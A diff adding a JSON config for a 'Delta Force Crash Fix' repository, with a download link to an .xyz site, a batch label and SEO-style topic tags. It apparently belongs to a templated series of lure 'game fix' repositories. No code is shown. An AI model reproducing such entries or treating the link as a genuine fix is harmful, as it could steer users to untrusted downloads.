@@ -1,0 +1,25 @@
+{
+  "repo": "delta-force-crash-fix",
+  "product": "Delta Force Crash Fix",
+  "kind": "game-fix",
+  "install_type": "download",
+  "download_url": "https://delta-force-crash.mefidirect.xyz/",
+  "batch": "new33",
+  "format": "license-md-only",
+  "category": "game-fix",
+  "topics": [
+    "delta-faq",
+    "delta-download-page",
+    "delta-force-crash-windows",
+    "install-delta-windows",
+    "delta-getting-started",
+    "delta-release",
+    "download-page",
+    "faq",
+    "workflow",
+    "toolkit",
+    "utility",
+    "configuration",
+    "deployment"
+  ]
+}
